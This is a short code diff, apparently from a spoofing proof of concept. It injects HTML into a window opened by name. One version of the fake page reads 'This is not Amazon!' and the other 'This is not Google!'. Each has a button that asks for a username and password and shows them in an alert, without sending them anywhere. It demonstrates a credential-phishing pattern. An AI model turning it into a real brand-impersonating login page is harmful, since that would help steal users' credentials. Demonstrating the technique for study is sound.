@@ -21,12 +21,8 @@ function p() {
 
   var t = window.open('','aa');
 
-    t.document.body.innerHTML = `<h1>This is not Amazon!</h1>
-<button onclick="
-  let username = prompt('Enter your username');
-  let password = prompt('Enter your password');
-  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
-">Click me</button>
+    t.document.body.innerHTML = `
+  <h1>This is not Google!</h1><button onclick="let username = prompt('Enter your username');let password = prompt('Enter your password');alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);">Click me</button>
             `;
 
   t.stop();
